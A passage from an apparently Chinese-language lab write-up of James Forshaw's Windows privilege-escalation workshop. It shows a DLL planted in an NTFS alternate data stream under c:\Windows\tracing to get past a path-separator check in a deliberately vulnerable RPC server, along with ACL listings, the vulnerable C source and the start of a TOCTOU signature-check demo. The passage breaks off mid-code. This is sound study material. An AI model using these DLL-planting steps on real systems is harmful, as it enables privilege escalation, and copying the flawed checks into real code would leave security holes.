..\..\..\..\workshop\ExploitTools\testdll32.dll</span><br><span class="line">Error calling RPC function</span><br><span class="line">[RPC Tests]</span><br><span class="line">1 - Test Create Process</span><br><span class="line">2 - Test Load Library</span><br><span class="line">3 - Test Load Library with Path Check</span><br><span class="line">4 - Test Load Library TOCTOU</span><br><span class="line">5 - Test Load Library TOCTOU Hardened</span><br><span class="line">6 - Duplicate handle</span><br><span class="line">0 - Exit Menu</span><br></pre></td></tr></table></figure>

<p>这次没有成功，RpcServer.exe 提示发现了路径分隔符，经过几次测试发现，RpcServer.exe 会检查输入的路径中是否含有 ‘/‘ 和 ‘&#39; 分隔符，如果有则拒绝加载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TestLoadLibraryCanonical called</span><br><span class="line">Error, name contains path separators</span><br></pre></td></tr></table></figure>

<p>所以我们的目标就是，路径中不出现 ‘/‘和’&#39;，但是路径指向的文件又是可控的(在 Tasks、tracing 目录下创建的文件也不行)</p>
<p>在文档中，James Forshaw 给出的方法是 ADS(Alternate Data Steam)，在 C:\Windows 目录下，找到可以写入 Data Stream 的路径写入 TestDll32.dll。</p>
<p>他找的的路径是 c:\windows\tracing，经过测试发现普通用户（非管理员）有权限向 c:\windows\tracing 目录写入 ADS</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c:\workshop\ExploitTools&gt;CopyFile.exe TestDll32.dll c:\Windows\tracing:xyz.dll</span><br><span class="line">Copied TestDll32.dll to c:\Windows\tracing:xyz.dll</span><br><span class="line"></span><br><span class="line">c:\workshop\ExploitTools&gt;</span><br></pre></td></tr></table></figure>

<p>之后再次测试 Test Load Library with Path Check，路径输入 tracding:xyz.dll，成功！</p>
<h3 id="6-1-c-windows-tracing-路径的权限有什么特殊吗"><a href="#6-1-c-windows-tracing-路径的权限有什么特殊吗" class="headerlink" title="6.1 c:\windows\tracing 路径的权限有什么特殊吗"></a>6.1 c:\windows\tracing 路径的权限有什么特殊吗</h3><p>比 c:\windows\ 下的其他目录多好几个权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">c:\workshop\ExploitTools&gt;..\sandbox-attacksurface-analysis-tools\CheckFileAccess.exe c:\Windows</span><br><span class="line"></span><br><span class="line">\??\c:\Windows\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\_default.pif : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\bfsvc.exe : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\bootstat.dat : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\DtcInstall.log : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\explorer.exe : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\HelpPane.exe : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\hh.exe : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\lsasetup.log : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\mib.bin : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\notepad.exe : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Professional.xml : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\regedit.exe : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\setupact.log : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\setuperr.log : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\splwow64.exe : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\system.ini : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\twain.dll : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\twain_32.dll : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\twunk_16.exe : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\twunk_32.exe : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\win.ini : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\WindowsShell.Manifest : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\WindowsUpdate.log : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\winhelp.exe : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\winhlp32.exe : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\WMSysPr9.prx : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\write.exe : 001200A9 ReadData, ReadEa, Execute, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\addins\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\appcompat\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\apppatch\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\AppReadiness\ : 00120089 ListDirectory, ReadEa, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\assembly\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\bcastdvr\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\BitLockerDiscoveryVolumeContents\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Boot\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Branding\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\CbsTemp\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Cursors\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\debug\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\diagnostics\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\DigitalLocker\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Downloaded Program Files\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\ELAMBKUP\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\en-US\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Fonts\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\GameBarPresenceWriter\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Globalization\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Help\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\IME\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\ImmersiveControlPanel\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\INF\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\InputMethod\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Installer\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\L2Schemas\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Logs\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Media\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Microsoft.NET\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Migration\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\MiracastView\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\OCR\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Offline Web Pages\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Panther\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Performance\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\PLA\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\PolicyDefinitions\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\PrintDialog\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Provisioning\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Registration\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\RemotePackages\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\rescache\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Resources\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\SchCache\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\schemas\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\security\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\ServiceProfiles\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\servicing\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Setup\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\ShellExperiences\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\SKB\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\SoftwareDistribution\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Speech\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Speech_OneCore\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\System\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\System32\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\SystemApps\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\SystemResources\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\TAPI\ : 00120089 ListDirectory, ReadEa, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Tasks\ : 001200AB ListDirectory, AddFile, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\tracing\ : 001201BF ListDirectory, AddFile, AddSubDirectory, ReadEa, WriteEa, Traverse, ReadAttributes, WriteAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\twain_32\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Vss\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\Web\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\WinSxS\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\zh-CN\ : 001200A9 ListDirectory, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">Error dumping file \??\c:\Windows\CSC (0xC0000022) - &#123;无法访问&#125;</span><br><span class="line">过程已请求访问一对象，但未给访问权限。</span><br><span class="line"></span><br><span class="line">Error dumping file \??\c:\Windows\InfusedApps (0xC0000022) - &#123;无法访问&#125;</span><br><span class="line">过程已请求访问一对象，但未给访问权限。</span><br><span class="line"></span><br><span class="line">Error dumping file \??\c:\Windows\LiveKernelReports (0xC0000022) - &#123;无法访问&#125;</span><br><span class="line">过程已请求访问一对象，但未给访问权限。</span><br><span class="line"></span><br><span class="line">Error dumping file \??\c:\Windows\ModemLogs (0xC0000022) - &#123;无法访问&#125;</span><br><span class="line">过程已请求访问一对象，但未给访问权限。</span><br><span class="line"></span><br><span class="line">Error dumping file \??\c:\Windows\Prefetch (0xC0000022) - &#123;无法访问&#125;</span><br><span class="line">过程已请求访问一对象，但未给访问权限。</span><br><span class="line"></span><br><span class="line">Error dumping file \??\c:\Windows\Temp (0xC0000022) - &#123;无法访问&#125;</span><br><span class="line">过程已请求访问一对象，但未给访问权限。</span><br></pre></td></tr></table></figure>

<h3 id="6-2-非管理员权限启动的-console-shell-具有什么用户权限"><a href="#6-2-非管理员权限启动的-console-shell-具有什么用户权限" class="headerlink" title="6.2 非管理员权限启动的 console shell 具有什么用户权限"></a>6.2 非管理员权限启动的 console shell 具有什么用户权限</h3><p>如果当前用户属于管理员组(Administrators)，那么启动的 shell 进程是具有 limited token，比如访问 c:\windows\system32 会被拒绝，而管理员权限的 shell 进程具有 full token</p>
<h3 id="6-3-创建-ADS-需要什么权限"><a href="#6-3-创建-ADS-需要什么权限" class="headerlink" title="6.3 创建 ADS 需要什么权限"></a>6.3 创建 ADS 需要什么权限</h3><p>对比测试 c:\Windows\tracing 和 c:\Windows\Tasks 两个目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c:\workshop\ExploitTools&gt;CopyFile.exe TestDll32.dll c:\Windows\tracing:xyz.dll</span><br><span class="line">Copied TestDll32.dll to c:\Windows\tracing:xyz.dll</span><br><span class="line"></span><br><span class="line">c:\workshop\ExploitTools&gt;CopyFile.exe TestDll32.dll c:\Windows\Tasks:xyz.dll</span><br><span class="line">Error copying file</span><br><span class="line"></span><br><span class="line">c:\workshop\ExploitTools&gt;</span><br></pre></td></tr></table></figure>

<p>向 c:\Windows\Tasks 目录创建 ADS 失败了，</p>
<p>对比查看两个文件夹的 permissions</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\??\c:\Windows\Tasks\ : 001200AB ListDirectory, AddFile, ReadEa, Traverse, ReadAttributes, ReadControl, Synchronize</span><br><span class="line">\??\c:\Windows\tracing\ : 001201BF ListDirectory, AddFile, AddSubDirectory, ReadEa, WriteEa, Traverse, ReadAttributes, WriteAttributes, ReadControl, Synchronize</span><br></pre></td></tr></table></figure>

<p>Tasks 目录缺少的 Permission 为：AddSubDirectory、WriteEa、WriteAttributes</p>
<p>剩下这 3 个可疑的权限，如何判断是哪个生效的呢？</p>
<p>鼠标右键新建一个测试文件夹 c:\workshop\test_ads，默认情况下 test_ads 会继承 c:\ 的访问权限。当前用户具有对该文件夹的读/写/修改权限等大部分权限。</p>
<p>文件夹右键-&gt;属性-&gt;安全-&gt;高级-&gt;禁用继承-&gt;将已经继承的权限转换为当前文件的显式权限-&gt;此时就可以编辑各个权限了，针对某个具体的高级权限启用或者禁用</p>
<p>根据实际测试， AddSubDirectory、WriteEa、WriteAttributes 这三个权限，缺少哪个，都不能在 test_ads 文件夹中创建 ADS 和拷贝文件。这一点与 James Forshaw PPT 第 88 页的结果不太一致，他只强调了 AddSubDirectory 权限与 Alternate Data Steam 创建有关。</p>
<h3 id="6-4-如何查看依附在某个文件或者文件夹上的-ADS"><a href="#6-4-如何查看依附在某个文件或者文件夹上的-ADS" class="headerlink" title="6.4 如何查看依附在某个文件或者文件夹上的 ADS"></a>6.4 如何查看依附在某个文件或者文件夹上的 ADS</h3><p>利用 Sysinternals 工具集中的 streams.exe 工具可以查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\test&gt; C:\workshop\Sysinternals\streams.exe C:\Windows\tracing</span><br><span class="line"></span><br><span class="line">Streams v1.56 - Enumerate alternate NTFS data streams</span><br><span class="line">Copyright (C) 1999-2007 Mark Russinovich</span><br><span class="line">Sysinternals - www.sysinternals.com</span><br><span class="line"></span><br><span class="line">C:\Windows\tracing:</span><br><span class="line">         :xyz.dll:$DATA 205824</span><br></pre></td></tr></table></figure>

<h3 id="6-5-如何删除-ADS-Alternate-Data-Steam"><a href="#6-5-如何删除-ADS-Alternate-Data-Steam" class="headerlink" title="6.5 如何删除 ADS(Alternate Data Steam)"></a>6.5 如何删除 ADS(Alternate Data Steam)</h3><p>目前还没有找到直接删除 ADS 的快捷方法，只看到有文章中提到可以通过 ren（重命名）的方式实现，相当于删除目录（或文件）之后再次创建。</p>
<h3 id="6-6-该漏洞所在的函数"><a href="#6-6-该漏洞所在的函数" class="headerlink" title="6.6 该漏洞所在的函数"></a>6.6 该漏洞所在的函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RpcServer.c</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function">boolean <span class="title">TestLoadLibraryCanonical</span><span class="params">(<span class="keyword">handle_t</span> hBinding, <span class="keyword">const</span> <span class="keyword">wchar_t</span>* name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"TestLoadLibraryCanonical called\n"</span>);</span><br><span class="line">	<span class="keyword">if</span> (wcschr(name, <span class="string">'\\'</span>) || wcschr(name, <span class="string">'/'</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Error, name contains path separators\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">std</span>::wstring full_path = GetPathFromEnv(FOLDERID_Windows) + <span class="string">L"\\"</span> + name;</span><br><span class="line">  <span class="keyword">return</span> TestLoadLibrary(hBinding, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="7-DEMO-7-TOCTOU-on-Name"><a href="#7-DEMO-7-TOCTOU-on-Name" class="headerlink" title="7 DEMO 7 : TOCTOU on Name"></a>7 DEMO 7 : TOCTOU on Name</h2><p>选择 TOCTOU LoadLibrary 测试项目之后，提示加载失败</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Specify library name: Tasks\xyz.dll</span><br><span class="line">Error calling RPC function</span><br><span class="line">[RPC Tests]</span><br><span class="line">1 - Test Create Process</span><br><span class="line">2 - Test Load Library</span><br><span class="line">3 - Test Load Library with Path Check</span><br><span class="line">4 - Test Load Library TOCTOU</span><br><span class="line">5 - Test Load Library TOCTOU Hardened</span><br><span class="line">6 - Duplicate handle</span><br><span class="line">0 - Exit Menu</span><br><span class="line">Specify operation number: 4</span><br><span class="line"></span><br><span class="line">Specify library name: tracing:xyz.dll</span><br><span class="line">Error calling RPC function</span><br></pre></td></tr></table></figure>

<p>服务端的输出日志提示是 Verify 失败</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error verifying file: Module not in system directory</span><br></pre></td></tr></table></figure>

<p>查看源码, LoadLibrary 之前调用了系统 API WinVerifyTrust 检测了文件签名</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> <span class="function">boolean <span class="title">TestLoadLibraryTocTou</span><span class="params">(<span class="keyword">handle_t</span> hBinding, <span class="keyword">const</span> <span class="keyword">wchar_t</span>* lib_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (VerifyEmbeddedSignature(lib_path))</span><br><span class="line">  &#123;</span><br><span class="line">    HMODULE hModule = LoadLibrary(lib_path);</span><br><span class="line">    <span class="keyword">if</span> (hModule != <span class="literal">nullptr</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Loaded module: %p\n"</span>, hModule);</span><br><span class="line">      FreeLibrary(hModule);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Error loading module: %ls\n"</span>, GetErrorMessage(GetLastError()).c_str());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Module not in system directory\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">VerifyEmbeddedSignature</span><span class="params">(LPCWSTR pwszSourceFile)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">  lStatus = WinVerifyTrust(</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    &amp;WVTPolicyGUID,</span><br><span class="line">    &amp;WinTrustData);</span><br><span class="line"></span><br><span class="line">  